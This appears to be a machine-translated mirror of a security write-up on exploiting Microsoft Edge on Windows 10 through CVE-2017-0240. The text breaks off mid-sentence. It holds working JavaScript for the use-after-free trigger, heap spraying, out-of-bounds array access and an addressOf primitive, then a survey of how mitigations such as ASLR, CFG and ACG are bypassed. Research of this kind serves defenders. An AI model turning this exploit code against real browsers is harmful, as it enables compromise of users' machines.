<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>📈 👨🏾‍🤝‍👨🏻 👵🏼 Microsoft Edge dari CVE hingga RCE pada Windows 10 🙆🏾 👩🏻‍🎤 📫</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dalam kerangka kerja artikel ini, kami akan mempertimbangkan secara cukup rinci proses penulisan eksploit untuk kerentanan di Microsoft Edge, dengan k...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Microsoft Edge dari CVE hingga RCE pada Windows 10</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="Intro"></p><br><p>  Dalam kerangka kerja artikel ini, kami akan mempertimbangkan secara cukup rinci proses penulisan eksploit untuk kerentanan di Microsoft Edge, dengan keluar selanjutnya dari kotak pasir.  Jika Anda tertarik untuk mengetahui seperti apa proses ini, selamat datang di bawah kucing! </p><a name="habracut"></a><br><h2 id="vvedenie">  Pendahuluan </h2><br><p> Pada <code>Pwn2Own 2019</code> terbaru di Montreal, dalam kategori browser, sebuah eksploitasi untuk meretas <code>Microsoft Edge</code> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">didemonstrasikan</a> .  Dua kerentanan digunakan untuk ini: <code>double free</code> di renderer dan kerentanan logis untuk keluar dari kotak pasir.  Kedua kerentanan ini baru saja ditutup dan diberikan <code>CVE</code> sesuai: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><code>CVE-2019-0940</code></a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><code>CVE-2019-0938</code></a> .  Anda dapat membaca lebih lanjut tentang kerentanan di blog: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Pwn2Own 2019: Eksploitasi Microsoft Edge Renderer (CVE-2019-0940).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bagian 1</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Pwn2Own 2019: Microsoft Eedge Sandbox Escape (CVE-2019-0938).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bagian 2</a> </p><br><p>  Sebagai bagian dari artikel kami, kami ingin menunjukkan proses penulisan eksploit seperti itu dan berapa banyak waktu dan sumber daya yang diperlukan untuk ini menggunakan contoh <code>Microsoft Edge</code> pada <code>Windows 10</code> menggunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><code>CVE-2017-0240</code></a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><code>CVE-2016-3309</code></a> .  Salah satu perbedaannya adalah bahwa jika exploit yang didemonstrasikan di <code>Pwn2Own</code> menggunakan kerentanan logis untuk keluar dari sandbox, maka dalam skenario kami, kerentanan di kernel <code>Windows 10</code> akan digunakan untuk keluar dari sandbox.  Seperti yang ditunjukkan oleh tambalan dari <code>Microsoft</code> , ada lebih banyak kerentanan di kernel daripada kerentanan dalam implementasi sandbox.  Akibatnya, rantai kerentanan seperti itu jauh lebih mungkin ditemui, dan akan berguna untuk mengetahui karyawan IS di perusahaan. </p><br><h2 id="ishodnye-dannye">  Sumber data </h2><br><p>  Artikel ini akan membahas proses penulisan eksploitasi 1 hari untuk browser <code>Microsoft Edge</code> .  <code>CVE-2017-0240</code> akan dioperasikan.  Tahap pertama operasi akan didasarkan pada bahan dari sumber [1], kita akan mendapatkan <code>arbitrary address read/write</code> primitif, dan juga berkenalan dengan berbagai teknik yang mungkin berguna dalam mengeksploitasi kerentanan tersebut.  Selanjutnya, kami akan memperkenalkan Anda ke alat <code>pwn.js</code> , yang akan membantu Anda mendapatkan panggilan ke fungsi sewenang-wenang berdasarkan membaca dan menulis sewenang-wenang, dan juga akan mempertimbangkan berbagai <code>mitigations</code> dan cara untuk memotongnya.  Pada tahap terakhir, kerentanan kernel Windows <code>CVE-2016-3309</code> akan dieksploitasi untuk meningkatkan hak istimewa, memotong batasan <code>AppContainer</code> dan mendapatkan kontrol penuh atas mesin yang diserang. </p><br><p>  Pengoperasian akan dilakukan di dudukan dengan <code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code> dan browser <code>Microsoft Edge (40.15063.0.0)</code> . </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva">  Langkah 1. Mendapatkan <code>arbitrary address read/write</code> primitif </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob">  Deskripsi Kerentanan dan Perolehan <code>OOB</code> </h3><br><p>  Kerentanan tipe <code>use-after-free</code> hadir dalam metode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">copyFromChannel</a> dari objek <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Audio Buffer</a> . </p><br><blockquote>  AudioBuffer adalah antarmuka aset audio pendek yang terletak di memori dan dibuat dari file audio menggunakan metode AudioContext.decodeAudioData (), atau dari sumber data menggunakan metode AudioContext.createBuffer ().  Data audio yang ditempatkan di AudioBuffer dapat diputar di AudioBufferSourceNode. </blockquote><p>  Presentasi <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code> memberikan analisis terperinci tentang kerentanan dan tambalan.  Ketika metode <code>copyFromChannel</code> , isi saluran buffer audio disalin ke buffer <code>destination</code> ditentukan oleh argumen pertama.  Metode ini juga menerima nomor saluran ( <code>channelNumber</code> ) dan offset dalam buffer audio ( <code>startInChannel</code> ), mulai dari mana penyalinan diperlukan.  Sebelum secara langsung menyalin data ke <code>destination</code> dalam fungsi <code>CDOMAudioBuffer::Var_copyFromChannel</code> , buffer <code>destination</code> -cache (alamat dan ukuran buffer disimpan dalam variabel fungsi lokal di stack) dan nilai <code>channelNumber</code> dan <code>startInChannel</code> objek <code>startInChannel</code> ke tipe <code>Int</code> , untuk mana <code>valueOf</code> metode objek yang dikonversi dipanggil.  Kerentanannya adalah buffer yang di-cache dapat dibebaskan pada saat konversi tipe dalam metode yang ditimpa objek <code>valueOf</code> .  Untuk verifikasi, kami menggunakan kode berikut: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p>  Kode ini menggunakan teknologi <code>Web Workers</code> untuk membebaskan buffer.  Setelah membuat <code>Worker</code> kosong, kami dapat mengiriminya pesan menggunakan metode <code>postMessage</code> .  Argumen <code>transfer</code> opsional kedua dari metode ini menerima larik objek yang dapat <code>Transferable</code> ( <code>ArrayBuffer</code> , <code>MessagePost</code> atau <code>ImageBitmap</code> ), hak atas objek akan ditransfer ke <code>Worker</code> dan objek tidak akan lagi tersedia dalam konteks saat ini, sehingga dapat dihapus.  Setelah ini, panggilan untuk <code>sleep</code> terjadi - fungsi yang untuk sementara menghentikan eksekusi suatu program (ini diterapkan secara independen).  Ini diperlukan agar sistem pengumpulan sampah ( <code>GC</code> , <code>Garbage Collector</code> ) berhasil membebaskan buffer, hak-hak yang ditransfer. </p><br><blockquote>  Pekerja Web menyediakan cara sederhana untuk menjalankan skrip di utas latar belakang.  Utusan pekerja dapat melakukan tugas tanpa mengganggu antarmuka pengguna.  Selain itu, mereka dapat melakukan I / O menggunakan XMLHttpRequest (meskipun atribut responseXML dan kanal akan selalu nol).  Pekerja yang ada dapat mengirim pesan JavaScript ke kode pembuat melalui pengendali acara yang ditentukan oleh kode ini (dan sebaliknya). </blockquote><p>  Dengan menjalankan kode ini di Edge di bawah debugger, Anda bisa mendapatkan crash berikut. </p><br><p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="Langkah 01 macet"></p><br><p>  Akibatnya, panggilan ke <code>copyFromChannel</code> mencoba menyalin konten buffer audio ke area memori yang tidak terisi.  Untuk mengeksploitasi kerentanan, perlu untuk mencapai alokasi objek apa pun di area memori ini.  Dalam hal ini, segmen array sempurna. </p><br><p>  Array dalam <code>Chakra</code> (mesin <code>JS</code> yang digunakan dalam browser <code>Edge</code> ) disusun sebagai berikut: objek array memiliki ukuran tetap, pointer ke objek array (atau nilai, dalam kasus <code>IntArray</code> ) disimpan di area memori yang terpisah - segmen, pointer ke mana terdapat di objek. array  Header segmen berisi berbagai informasi, termasuk ukuran segmen, yang sesuai dengan ukuran array.  Ukuran array juga ada pada objek array itu sendiri.  Secara skematis, tampilannya seperti ini: </p><br><p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="Struktur array"></p><br><p>  Dengan demikian, jika kita berhasil memilih segmen array di ruang yang sebelumnya dibebaskan, maka kita dapat menimpa header segmen array dengan isi buffer audio.  Untuk melakukan ini, kami memodifikasi kode di atas dengan menambahkan baris berikut setelah <code>sleep(1000);</code>  : </p><br><pre> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p>  Ukuran array dipilih sehingga ukuran segmen array menempati seluruh segmen heap (potongan memori minimum yang tidak dapat dibagi, ukurannya adalah 0x10000 byte).  Jalankan kode ini, tentukan fungsi <code>memcpy</code> sebagai breakpoint (akan ada banyak panggilan <code>memcpy</code> , jadi masuk akal untuk berhenti dulu di <code>edgehtml!WebCore::AudioBufferData::copyBufferData</code> ), di mana crash terjadi.  Kami mendapatkan hasil sebagai berikut: </p><br><p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="Langkah 02"></p><br><p>  Hebat!  Sekarang kita dapat menimpa header segmen array dengan nilai kita sendiri.  Nilai yang paling menarik dalam hal ini adalah ukuran array, offset yang dapat kita lihat pada screenshot di atas.  Ubah isi buffer audio sebagai berikut: </p><br><pre> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p>  Perhatikan nilai-nilai <code>ta2[14]</code> dan <code>ta2[15]</code> - mereka sudah merujuk bukan ke header segmen, tetapi ke nilai array itu sendiri.  Dengan ini, kita dapat menentukan array yang kita butuhkan dalam array global sebagai berikut: </p><br><pre> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p>  Jika sebagai hasilnya ditemukan array, dua elemen pertama yang diubah dengan cara tertentu, maka semuanya baik-baik saja.  Sekarang kami memiliki array yang ukuran segmennya lebih besar dari yang sebenarnya.  Array yang tersisa dapat dibebaskan. </p><br><p>  Di sini perlu diingat bahwa ukuran array ada di dua entitas: di objek array, di mana ia tetap tidak berubah, dan di segmen array, di mana kami meningkatkannya.  Ternyata ukuran dalam objek array diabaikan jika kode dieksekusi dalam mode <code>JIT</code> dan telah dioptimalkan.  Ini mudah dicapai, misalnya, sebagai berikut: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p>  Setelah itu, menggunakan fungsi <code>arr_get</code> dan <code>arr_set</code> Anda dapat melampaui batas array ( <code>OOB</code> , <code>out-of-bound</code> ). </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu">  Menggunakan <code>OOB</code> untuk membuat primitif membaca dan menulis ke alamat yang sewenang-wenang </h3><br><p>  Di bagian ini, kami mempertimbangkan teknik yang memungkinkan Anda membaca dan menulis ke alamat arbitrer menggunakan <code>OOB</code> .  Metode yang digunakan untuk mendapatkan ini akan mirip dengan yang digunakan dalam sumber [1], tetapi juga akan ada perubahan signifikan. </p><br><p>  Dalam versi <code>Edge</code> digunakan <code>Edge</code> blok memori untuk heap dialokasikan secara berurutan, yang karenanya, ketika mengalokasikan sejumlah besar objek, cepat atau lambat mereka akan muncul setelah segmen array, di mana kita dapat pergi. </p><br><p>  Pertama, ini memberi kita kemampuan untuk membaca pointer ke tabel virtual metode objek ( <code>vftable</code> ), sehingga kita dapat memotong pengacakan ruang proses alamat ( <code>ASLR</code> ).  Tetapi akses ke objek mana yang akan membantu kita mencapai membaca dan menulis secara sewenang-wenang?  Beberapa objek <code>DataView</code> sangat bagus untuk ini. </p><br><blockquote>  DataView menyediakan antarmuka tingkat rendah untuk membaca dan menulis beberapa jenis angka dalam biner ArrayBuffer, terlepas dari urutan byte platform. </blockquote><p>  Struktur internal <code>DataView</code> berisi pointer ke buffer.  Untuk membaca dan menulis ke alamat yang berubah-ubah, misalnya, kita dapat membangun rantai dua <code>DataView</code> ( <code>dv1</code> dan <code>dv2</code> ) sebagai berikut: sebagai buffer <code>dv1</code> tentukan alamat <code>dv2</code> dengan mengakses array.  Sekarang menggunakan <code>dv1</code> kita dapat mengubah alamat buffer <code>dv2</code> , yang dengannya pembacaan dan penulisan sewenang-wenang dicapai.  Secara skematis, ini dapat direpresentasikan sebagai berikut: </p><br><p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="Alamat sembarang membaca / menulis"></p><br><p>  Untuk menggunakan metode ini, Anda perlu mempelajari cara menentukan alamat objek dalam memori.  Untuk melakukan ini, ada teknik berikut: Anda perlu membuat <code>Array</code> baru, gunakan <code>OOB</code> untuk menyimpan <code>vftable</code> dan <code>typeId</code> (dua bidang 64-bit pertama dari struktur) dan menetapkan objek yang alamatnya menarik ke elemen pertama array.  Kemudian, Anda harus mengembalikan nilai <code>vftable</code> dan <code>typeId</code> sebelumnya disimpan.  Sekarang kata ganda junior dan senior dari alamat objek dapat diperoleh dengan merujuk pada elemen pertama dan kedua dari array.  Faktanya adalah, secara default, array baru adalah <code>IntArray</code> , dan nilai-nilai 4-byte array disimpan di segmennya sebagaimana adanya.  Saat menetapkan objek ke array, array dikonversi ke <code>ObjectArray</code> , dan segmennya digunakan untuk menyimpan alamat objek.  Konversi mengubah <code>vftable</code> dan <code>typeId</code> .  Dengan demikian, jika kita mengembalikan nilai asli <code>vftable</code> dan <code>typeId</code> , melalui elemen array ini kita dapat mengakses segmen secara langsung.  Proses yang dijelaskan secara skematis dapat direpresentasikan sebagai berikut: </p><br><p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="Pointer bocor"></p><br><p>  Fungsi untuk mendapatkan alamat akan terlihat seperti ini: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p>  Pertanyaan terbuka tetap berupa penciptaan objek yang diperlukan dan pencarian mereka menggunakan <code>OOB</code> .  Seperti disebutkan sebelumnya, ketika mengalokasikan sejumlah besar objek, cepat atau lambat mereka akan mulai menonjol setelah segmen array, di luar itu kita dapat pergi.  Untuk menemukan objek yang diperlukan, Anda hanya perlu menelusuri indeks di luar array untuk mencari objek yang diperlukan.  Karena  semua objek dari tipe yang sama terletak di satu segmen tumpukan, Anda dapat mengoptimalkan pencarian dan pergi melalui segmen tumpukan dengan peningkatan <code>0x10000</code> , dan periksa hanya beberapa nilai pertama dari awal setiap segmen tumpukan.  Untuk mengidentifikasi objek, Anda dapat menetapkan nilai unik untuk beberapa parameter (misalnya, untuk <code>DataView</code> dapat berupa <code>byteOffset</code> ) atau, menggunakan konstanta yang sudah diketahui dalam struktur objek (misalnya, dalam versi <code>Edge</code> digunakan dalam <code>IntArray</code> , nilai <code>0x10005</code> selalu ditemukan pada <code>0x18</code> ). </p><br><p>  Dengan menggabungkan semua teknik di atas, Anda dapat membaca dan menulis ke alamat yang berubah-ubah.  Di bawah ini adalah tangkapan layar untuk membaca objek memori <code>DataView</code> . </p><br><p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="Kebocoran memori"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api">  Langkah 2. Melakukan fungsi API sewenang-wenang </h2><br><p>  Pada tahap ini, kami dapat membaca dan menulis ke alamat sewenang-wenang di dalam proses tampilan konten <code>Edge</code> .  Pertimbangkan teknologi utama yang harus mengganggu operasi lebih lanjut dari aplikasi dan solusi mereka.  Kami sudah menulis serangkaian artikel pendek <code>  app specific security mitigation</code> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bagian 1, pengantar</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bagian 2, Internet Explorer dan Edge</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bagian 3, Google Chrome</a> ), tetapi perlu diingat bahwa pengembang tidak tinggal diam dan menambahkan alat baru ke produk mereka perlindungan. </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr">  Address Space Randomization ( <code>ASLR</code> ) </h3><br><blockquote>  ASLR (English address space layout randomization) adalah teknologi yang digunakan dalam sistem operasi yang secara acak mengubah lokasi struktur data penting dalam ruang alamat proses, yaitu: gambar file yang dapat dieksekusi, perpustakaan yang dimuat, tumpukan dan tumpukan. </blockquote><p>  Di atas, kami belajar membaca alamat tabel kelas virtual, menggunakannya, kami dapat dengan mudah menghitung alamat dasar modul <code>Chakra.dll</code> , sehingga <code>ASLR</code> tidak menimbulkan masalah untuk operasi lebih lanjut. </p><br><h3 id="data-execution-protection-dep-nx">  Perlindungan eksekusi data ( <code>DEP</code> , <code>NX</code> ) </h3><br><blockquote>  Pencegahan Eksekusi Data (DEP) adalah fitur keamanan yang dibangun di Linux, Mac OS X, Android, dan Windows yang mencegah aplikasi untuk mengeksekusi kode dari area memori yang ditandai sebagai "hanya data".  Ini akan mencegah beberapa serangan, yang, misalnya, menyimpan kode di area tersebut menggunakan buffer overflows. </blockquote><p>  Salah satu cara untuk melindungi ini adalah dengan memanggil <code>VirtualAlloc</code> menggunakan rantai <code>ROP</code> .  Tetapi dalam kasus <code>Edge</code> metode ini tidak akan berfungsi karena <code>ACG</code> (lihat di bawah). </p><br><h3 id="control-flow-guard-cfg">  Control Flow Guard ( <code>CFG</code> ) </h3><br><blockquote>  <code>CFG</code> adalah mekanisme perlindungan yang bertujuan mempersulit proses eksploitasi kerentanan biner dalam aplikasi mode pengguna dan kernel.  Pekerjaan mekanisme ini terdiri dalam memvalidasi panggilan tidak langsung, yang mencegah penyerang mencegat utas eksekusi (misalnya, dengan menimpa tabel fungsi virtual) </blockquote><p>  Teknologi ini hanya mengontrol panggilan tidak langsung, misalnya, panggilan metode dari tabel virtual fungsi objek.  Alamat pengirim pada tumpukan tidak dikontrol, dan ini dapat digunakan untuk membangun rantai <code>ROP</code> .  Penggunaan rantai <code>ROP/JOP/COP</code> dapat terhalang oleh teknologi baru <code>Intel</code> : <code>Control-flow Enforcement Technology</code> ( <code>CET</code> ).  Teknologi ini terdiri dari dua bagian: </p><br><ol><li>  <code>Shadow Stack</code> (shadow stack) - digunakan untuk mengontrol alamat pengirim dan melindungi rantai <code>ROP</code> ; </li><li>  <code>Indirect Branch Tracking</code> adalah metode perlindungan terhadap rantai <code>JOP/COP</code> .  Ini adalah instruksi <code>ENDBRANCH</code> baru, yang menandai semua alamat transisi yang valid untuk instruksi <code>call</code> dan <code>jmp</code> . </li></ol><br><h3 id="arbitrary-code-guard-acg">  Penjaga Kode Sewenang-wenang ( <code>ACG</code> ) </h3><br><blockquote>  <code>ACG</code> adalah teknologi yang mencegah pembuatan kode dinamis (dilarang mengalokasikan area memori <code>VirtaulAlloc</code> menggunakan <code>VirtaulAlloc</code> ) dan modifikasinya (tidak mungkin untuk <code>VirtaulAlloc</code> kembali area memori yang ada sebagai yang dapat dieksekusi) </blockquote><p>  Perlindungan ini, seperti <code>CFG</code> , tidak mencegah penggunaan rantai <code>ROP</code> . </p><br><h3 id="appcontainer-isolation">  Isolasi AppContainer </h3><br><blockquote>  AppContainer adalah teknologi Microsoft yang memungkinkan Anda mengisolasi suatu proses dengan menjalankannya di lingkungan berpasir.  Teknologi ini membatasi akses suatu proses ke kredensial, perangkat, sistem file, jaringan, proses dan jendela lain dan bertujuan meminimalkan kemampuan malware yang memiliki kemampuan untuk mengeksekusi kode arbitrer dalam suatu proses. </blockquote><p>  Perlindungan ini sangat menyulitkan proses operasi.  Karena itu, kami tidak dapat memanggil file pihak ketiga yang dapat dieksekusi atau mengakses informasi pengguna yang sensitif dalam memori atau pada disk.  Namun, perlindungan ini dapat diatasi dengan menggunakan kerentanan dalam penerapan kotak pasir AppContainer atau dengan meningkatkan hak istimewa melalui pemanfaatan kerentanan di kernel OS. </p><br><p>  Perlu dicatat bahwa <code>Microsoft</code> memiliki <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">program hadiah</a> terpisah untuk teknik menghindari teknologi <code>security mitigation</code> .  Program menunjukkan bahwa menggunakan kembali kode yang dapat dieksekusi (membangun rantai <code>ROP</code> adalah variasi 